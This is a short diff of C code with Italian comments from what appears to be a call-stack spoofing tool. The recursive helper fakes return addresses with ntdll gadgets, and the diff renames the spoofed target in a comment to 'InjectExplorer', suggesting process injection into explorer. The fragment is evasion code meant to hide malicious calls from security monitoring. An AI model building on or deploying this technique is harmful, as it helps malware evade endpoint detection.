@@ -19,7 +19,7 @@ __declspec(noinline) static void RecursiveSpoofHelper(RECURSIVE_SPOOF_CONTEXT *c
 {
     if (ctx->currentDepth >= ctx->maxDepth) {
         // caso base: anche qui LR e' falsificato con spoofChain[maxDepth].
-        // SecretFunction vedra' un gadget ntdll al frame[01], non questo Helper.
+        // InjectExplorer vedra' un gadget ntdll al frame[01], non questo Helper.
         void *baseGadget = ctx->spoofChain[ctx->currentDepth];
         ctx->result = SpoofCallStack(ctx->targetFunc, baseGadget, ctx->parameter, NULL);
         return;
